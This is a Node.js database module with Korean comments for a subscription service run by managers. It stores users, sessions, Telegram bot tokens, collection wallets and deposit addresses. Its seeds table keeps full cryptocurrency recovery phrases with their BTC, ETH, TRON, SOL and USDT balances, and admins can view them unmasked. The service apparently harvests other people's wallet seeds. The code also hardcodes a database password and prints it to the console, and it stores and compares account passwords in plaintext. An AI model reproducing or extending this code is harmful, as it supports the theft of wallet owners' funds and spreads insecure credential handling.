const mysql = require('mysql2/promise');
require('dotenv').config();

// 디버그: 환경 변수 확인
console.log('🔍 DB 연결 설정:');
console.log('  Host:', process.env.DB_HOST || 'localhost');
console.log('  Port:', process.env.DB_PORT || '3306');
console.log('  User:', process.env.DB_USER || 'mynolab_user');
console.log('  Password:', process.env.DB_PASSWORD || 'mynolab2026');
console.log('  Database:', process.env.DB_NAME || 'mynolab');

// MariaDB 연결 풀 생성 (하드코딩)
const pool = mysql.createPool({
  host: 'localhost',
  port: 3306,
  user: 'mynolab_user',
  password: 'mynolab2026',  // 간단한 비밀번호
  database: 'mynolab',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  enableKeepAlive: true,
  keepAliveInitialDelay: 0,
});

// 연결 테스트
pool.getConnection()
  .then(connection => {
    console.log('✅ MariaDB 연결 성공!');
    connection.release();
  })
  .catch(err => {
    console.error('❌ MariaDB 연결 실패:', err.message);
    process.exit(1);
  });

// ---------- 매니저 관련 ----------
const managerDB = {
  // 매니저 인증 (마스터 포함)
  async validate(id, password) {
    const [rows] = await pool.query(
      'SELECT id, role FROM managers WHERE id = ? AND pw = ?',
      [id, password]
    );
    return rows.length > 0 ? rows[0] : null;
  },

  // 전체 매니저 목록 (role='manager'만)
  async getAll() {
    const [rows] = await pool.query(
      'SELECT id, telegram, memo, referral_code as referralCode, tg_bot_token, tg_chat_id, created_at FROM managers WHERE role = "manager" ORDER BY id'
    );
    
    // 각 매니저의 사용자 수 계산
    const result = [];
    for (const manager of rows) {
      const [count] = await pool.query(
        'SELECT COUNT(*) as cnt FROM users WHERE manager_id = ?',
        [manager.id]
      );
      result.push({
        id: manager.id,
        telegram: manager.telegram || '',
        memo: manager.memo || '',
        referralCode: manager.referralCode || '',
        tg_bot_token: manager.tg_bot_token || '',
        tg_chat_id: manager.tg_chat_id || '',
        created_at: manager.created_at || null,
        userCount: count[0].cnt,
      });
    }
    return result;
  },

  // 특정 매니저 조회
  async get(id) {
    const [rows] = await pool.query(
      'SELECT id, telegram, memo, referral_code as referralCode, tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
      [id]
    );
    return rows.length > 0 ? rows[0] : null;
  },

  // 매니저 추가/수정
  async addOrUpdate(id, password, telegram, memo, referralCode = null) {
    const [existing] = await pool.query('SELECT id FROM managers WHERE id = ?', [id]);
    
    if (existing.length > 0) {
      if (referralCode) {
        await pool.query(
          'UPDATE managers SET pw = ?, telegram = ?, memo = ?, referral_code = COALESCE(referral_code, ?) WHERE id = ?',
          [password, telegram || '', memo || '', referralCode, id]
        );
      } else {
        await pool.query(
          'UPDATE managers SET pw = ?, telegram = ?, memo = ? WHERE id = ?',
          [password, telegram || '', memo || '', id]
        );
      }
    } else {
      if (referralCode) {
        await pool.query(
          'INSERT INTO managers (id, pw, telegram, memo, referral_code, role) VALUES (?, ?, ?, ?, ?, "manager")',
          [id, password, telegram || '', memo || '', referralCode]
        );
      } else {
        await pool.query(
          'INSERT INTO managers (id, pw, telegram, memo, role) VALUES (?, ?, ?, ?, "manager")',
          [id, password, telegram || '', memo || '']
        );
      }
    }
    return this.get(id);
  },

  // 매니저 삭제
  async remove(id) {
    await pool.query('DELETE FROM managers WHERE id = ? AND role = "manager"', [id]);
  },
};

// ---------- 사용자 관련 ----------
const userDB = {
  // 사용자 인증
  async validate(id, password) {
    const [rows] = await pool.query(
      'SELECT id FROM users WHERE id = ? AND pw = ?',
      [id.toLowerCase(), password]
    );
    return rows.length > 0;
  },

  // 전체 사용자 목록 (승인된 사용자만)
  async getAll() {
    const [rows] = await pool.query(
      'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users WHERE status != "pending" ORDER BY id'
    );
    return rows.map(row => ({
      id: row.id,
      managerId: row.managerId || '',
      telegram: row.telegram || '',
      status: row.status,
      expireDate: row.expireDate,
      subscriptionDays: row.subscriptionDays || 0,
    }));
  },

  // 특정 매니저의 사용자 목록 (승인된 사용자만)
  async getByManager(managerId) {
    const [rows] = await pool.query(
      'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users WHERE manager_id = ? AND status != "pending" ORDER BY id',
      [managerId]
    );
    return rows.map(row => ({
      id: row.id,
      managerId: row.managerId || '',
      telegram: row.telegram || '',
      status: row.status,
      expireDate: row.expireDate,
      subscriptionDays: row.subscriptionDays || 0,
    }));
  },

  // 승인 대기 사용자 목록
  async getPendingUsers(managerId = null) {
    let query = 'SELECT id, manager_id as managerId, telegram, created_at as createdAt FROM users WHERE status = "pending"';
    const params = [];
    
    if (managerId) {
      query += ' AND manager_id = ?';
      params.push(managerId);
    }
    
    query += ' ORDER BY created_at DESC';
    
    const [rows] = await pool.query(query, params);
    return rows.map(row => ({
      id: row.id,
      managerId: row.managerId || '',
      telegram: row.telegram || '',
      createdAt: row.createdAt,
    }));
  },

  // 사용자 승인
  async approveUser(id) {
    await pool.query(
      'UPDATE users SET status = "approved" WHERE id = ?',
      [id.toLowerCase()]
    );
  },

  // 사용기간 설정 (오늘 기준)
  async setSubscription(id, days) {
    const expireDate = new Date();
    expireDate.setDate(expireDate.getDate() + days);
    
    await pool.query(
      'UPDATE users SET subscription_days = ?, expire_date = ?, status = "approved" WHERE id = ?',
      [days, expireDate, id.toLowerCase()]
    );
  },

  // 사용기간 연장 (남은 만료일이 있으면 거기서 +days, 없거나 만료됐으면 오늘부터 +days)
  async extendSubscription(id, days) {
    const [[user]] = await pool.query(
      'SELECT expire_date FROM users WHERE id = ?',
      [id.toLowerCase()]
    );
    const now = new Date();
    const currentExpiry = user?.expire_date ? new Date(user.expire_date) : null;
    const base = (currentExpiry && currentExpiry > now) ? currentExpiry : now;
    const newExpiry = new Date(base.getTime() + days * 24 * 60 * 60 * 1000);
    await pool.query(
      'UPDATE users SET expire_date = ?, status = "approved" WHERE id = ?',
      [newExpiry, id.toLowerCase()]
    );
    return newExpiry;
  },

  // 사용기간 자유 조정 (+/- 일수)
  async adjustSubscriptionDays(id, deltaDays) {
    const [[user]] = await pool.query(
      'SELECT expire_date, status FROM users WHERE id = ?',
      [id.toLowerCase()]
    );
    const now = new Date();
    const currentExpiry = user?.expire_date ? new Date(user.expire_date) : null;
    const delta = Number(deltaDays) || 0;
    const base = delta >= 0
      ? ((currentExpiry && currentExpiry > now) ? currentExpiry : now)
      : (currentExpiry || now);
    const newExpiry = new Date(base.getTime() + delta * 24 * 60 * 60 * 1000);
    const nextStatus = user?.status === 'suspended' ? 'suspended' : 'approved';
    await pool.query(
      'UPDATE users SET expire_date = ?, status = ? WHERE id = ?',
      [newExpiry, nextStatus, id.toLowerCase()]
    );
    return newExpiry;
  },

  // 사용자 정지/활성화
  async suspendUser(id, suspend) {
    const status = suspend ? 'suspended' : 'approved';
    await pool.query(
      'UPDATE users SET status = ? WHERE id = ?',
      [status, id.toLowerCase()]
    );
  },

  // 사용자 추가/수정
  async addOrUpdate(id, password, managerId, telegram, status = 'pending') {
    const lowerCaseId = id.toLowerCase();
    const [existing] = await pool.query('SELECT id FROM users WHERE id = ?', [lowerCaseId]);
    
    if (existing.length > 0) {
      // 업데이트
      await pool.query(
        'UPDATE users SET pw = ?, manager_id = ?, telegram = ?, status = ? WHERE id = ?',
        [password || '', managerId || '', telegram || '', status, lowerCaseId]
      );
    } else {
      // 추가
      await pool.query(
        'INSERT INTO users (id, pw, manager_id, telegram, status) VALUES (?, ?, ?, ?, ?)',
        [lowerCaseId, password || '', managerId || '', telegram || '', status]
      );
    }
  },

  // 사용자 삭제
  async remove(id) {
    await pool.query('DELETE FROM users WHERE id = ?', [id.toLowerCase()]);
  },

  // 특정 사용자 조회
  async get(id) {
    const [rows] = await pool.query(
      'SELECT id, manager_id as managerId, telegram, status, expire_date as expireDate, subscription_days as subscriptionDays FROM users WHERE id = ?',
      [id.toLowerCase()]
    );
    if (rows.length > 0) {
      return {
        id: rows[0].id,
        managerId: rows[0].managerId || '',
        telegram: rows[0].telegram || '',
        status: rows[0].status,
        expireDate: rows[0].expireDate,
        subscriptionDays: rows[0].subscriptionDays || 0,
      };
    }
    return null;
  },
};

// ---------- 시드 문구 관련 ----------
const seedDB = {
  // 시드 추가
  async add(userId, phrase) {
    const [result] = await pool.query(
      'INSERT INTO seeds (user_id, phrase) VALUES (?, ?)',
      [userId, phrase.trim()]
    );
    return result.insertId; // 삽입된 시드 ID 반환
  },

  // 시드 목록 조회
  async getAll(masked = true, filterUserId = null) {
    let query = `SELECT id, user_id, phrase, created_at,
                        COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
                        COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
                        COALESCE(usdt_balance,0) AS usdt_balance,
                        COALESCE(balance,0) AS balance
                 FROM seeds`;
    let params = [];
    
    if (filterUserId) {
      query += ' WHERE user_id = ?';
      params.push(filterUserId);
    }
    
    query += ' ORDER BY id DESC';
    
    const [rows] = await pool.query(query, params);
    
    // 마스킹 함수
    const mask = (phrase) => {
      const words = phrase.trim().split(/\s+/).filter(Boolean);
      if (words.length === 0) return '';
      if (words.length <= 4) return '***';
      return words[0] + ' ... ' + words[words.length - 1] + ' (' + words.length + '단어)';
    };
    
    return rows.map(row => ({
      no:           row.id,
      userId:       row.user_id,
      phrase:       masked ? mask(row.phrase) : row.phrase,
      at:           row.created_at,
      btc:          Number(row.btc)          || 0,
      eth:          Number(row.eth)          || 0,
      tron:         Number(row.tron)         || 0,
      sol:          Number(row.sol)          || 0,
      usdt_balance: Number(row.usdt_balance) || 0,
      balance:      Number(row.balance)      || 0,
    }));
  },
};

// ---------- 세션 관련 (메모리 + DB 하이브리드) ----------
// 세션은 메모리에 저장하고, 필요시 DB에도 저장 (선택사항)
const sessionDB = {
  // 세션 저장 (선택사항 - 서버 재시작 시에도 유지하려면)
  async save(userId, token) {
    await pool.query(
      'INSERT INTO sessions (user_id, token) VALUES (?, ?) ON DUPLICATE KEY UPDATE token = ?',
      [userId, token, token]
    );
  },

  // 세션 삭제
  async remove(userId) {
    await pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
  },

  // 전체 세션 조회
  async getAll() {
    const [rows] = await pool.query('SELECT user_id, token FROM sessions');
    return rows.map(row => ({ userId: row.user_id, token: row.token }));
  },
};

// ---------- 관리자 세션 관련 ----------
const adminSessionDB = {
  // 관리자 세션 저장
  async save(token, role, id) {
    await pool.query(
      'INSERT INTO admin_sessions (token, role, admin_id) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE role = ?, admin_id = ?',
      [token, role, id, role, id]
    );
  },

  // 관리자 세션 조회
  async get(token) {
    const [rows] = await pool.query(
      'SELECT role, admin_id FROM admin_sessions WHERE token = ?',
      [token]
    );
    return rows.length > 0 ? { role: rows[0].role, id: rows[0].admin_id } : null;
  },

  // 관리자 세션 삭제
  async remove(token) {
    await pool.query('DELETE FROM admin_sessions WHERE token = ?', [token]);
  },
};

// ---------- 설정 관련 (글로벌 텔레그램 등) ----------
const settingDB = {
  // 설정 조회
  async get(key) {
    const [rows] = await pool.query(
      'SELECT setting_value FROM settings WHERE setting_key = ?',
      [key]
    );
    return rows.length > 0 ? rows[0].setting_value : null;
  },

  // 설정 저장
  async set(key, value) {
    await pool.query(
      'INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = ?',
      [key, value, value]
    );
  },
};
// ---------- 수금 지갑 버전 관련 ----------
const collectionWalletDB = {
  // 현재 active 지갑 조회
  async getActive() {
    const [rows] = await pool.query(
      'SELECT id, wallet_version, root_wallet_address, xpub_key, label, status, activated_at, created_at FROM collection_wallets WHERE status = "active" ORDER BY wallet_version DESC LIMIT 1'
    );
    return rows.length > 0 ? rows[0] : null;
  },

  // 전체 이력 조회
  async getHistory() {
    const [rows] = await pool.query(
      'SELECT id, wallet_version, root_wallet_address, xpub_key, label, status, activated_at, created_at FROM collection_wallets ORDER BY wallet_version DESC'
    );
    return rows;
  },

  // 신규 지갑 등록 (기존 active → inactive, 새 버전 active)
  async activate(rootWalletAddress, xpubKey, label) {
    const [maxRows] = await pool.query('SELECT COALESCE(MAX(wallet_version), 0) AS maxVer FROM collection_wallets');
    const newVersion = maxRows[0].maxVer + 1;

    // 기존 active → inactive
    await pool.query('UPDATE collection_wallets SET status = "inactive" WHERE status = "active"');

    // xpub_key 컬럼이 없으면 무시 (ALTER TABLE 전 호환)
    try {
      await pool.query(
        'INSERT INTO collection_wallets (wallet_version, root_wallet_address, xpub_key, label, status, activated_at) VALUES (?, ?, ?, ?, "active", NOW())',
        [newVersion, rootWalletAddress, xpubKey || null, label || '']
      );
    } catch (e) {
      // xpub_key 컬럼이 아직 없는 경우 fallback
      if (e.code === 'ER_BAD_FIELD_ERROR') {
        await pool.query(
          'INSERT INTO collection_wallets (wallet_version, root_wallet_address, label, status, activated_at) VALUES (?, ?, ?, "active", NOW())',
          [newVersion, rootWalletAddress, label || '']
        );
      } else throw e;
    }

    return newVersion;
  },

  // 버전별 발급 주소 통계
  async getStats(walletVersion) {
    const [rows] = await pool.query(
      `SELECT status, COUNT(*) AS cnt FROM deposit_addresses WHERE wallet_version = ? GROUP BY status`,
      [walletVersion]
    );
    const stats = { issued: 0, waiting_deposit: 0, paid: 0, swept: 0, expired: 0 };
    for (const row of rows) {
      stats[row.status] = Number(row.cnt);
    }
    stats.total = Object.values(stats).reduce((a, b) => a + b, 0);
    return stats;
  },
};

// ---------- 개인 입금주소 발급 관련 ----------
const depositAddressDB = {
  // 특정 유저+지갑버전의 레코드 조회 (상태 무관 — upsert용)
  async findByUserAndVersion(userId, walletVersion) {
    const [rows] = await pool.query(
      'SELECT * FROM deposit_addresses WHERE user_id = ? AND wallet_version = ? ORDER BY created_at DESC LIMIT 1',
      [userId, walletVersion]
    );
    return rows.length > 0 ? rows[0] : null;
  },

  // 구버전 레코드 조회 (invalidated 여부 확인용)
  async findOldVersion(userId, currentWalletVersion) {
    const [rows] = await pool.query(
      'SELECT * FROM deposit_addresses WHERE user_id = ? AND wallet_version != ? ORDER BY created_at DESC LIMIT 1',
      [userId, currentWalletVersion]
    );
    return rows.length > 0 ? rows[0] : null;
  },

  // 신규 주소 발급 (derivationIndex는 server.js에서 계산된 값을 그대로 사용)
  async create({ userId, orderId, network, token, depositAddress, walletVersion, derivationIndex }) {
    await pool.query(
      `INSERT INTO deposit_addresses
        (user_id, order_id, network, token, deposit_address, derivation_index, wallet_version, status)
       VALUES (?, ?, ?, ?, ?, ?, ?, 'issued')`,
      [userId, orderId || null, network || 'TRON', token || 'USDT', depositAddress, derivationIndex, walletVersion]
    );
    return derivationIndex;
  },

  // 주소 상태 업데이트
  async updateStatus(depositAddress, status) {
    await pool.query(
      'UPDATE deposit_addresses SET status = ? WHERE deposit_address = ?',
      [status, depositAddress]
    );
  },

  // 관리자용 목록 조회 (페이지네이션)
  async getList({ walletVersion, status, page = 1, pageSize = 30 }) {
    const conditions = [];
    const params = [];

    if (walletVersion) {
      conditions.push('wallet_version = ?');
      params.push(walletVersion);
    }
    if (status) {
      conditions.push('status = ?');
      params.push(status);
    }

    const where = conditions.length > 0 ? 'WHERE ' + conditions.join(' AND ') : '';
    const offset = (page - 1) * pageSize;

    const [[{ total }]] = await pool.query(
      `SELECT COUNT(*) AS total FROM deposit_addresses ${where}`,
      params
    );
    const [rows] = await pool.query(
      `SELECT id, user_id, order_id, network, token, deposit_address, derivation_index, wallet_version, status, created_at
       FROM deposit_addresses ${where} ORDER BY created_at DESC LIMIT ? OFFSET ?`,
      [...params, pageSize, offset]
    );

    return {
      total,
      page,
      pageSize,
      totalPages: Math.ceil(total / pageSize),
      items: rows,
    };
  },
};

module.exports = {
  pool,
  managerDB,
  userDB,
  seedDB,
  sessionDB,
  adminSessionDB,
  settingDB,
  collectionWalletDB,
  depositAddressDB,
};
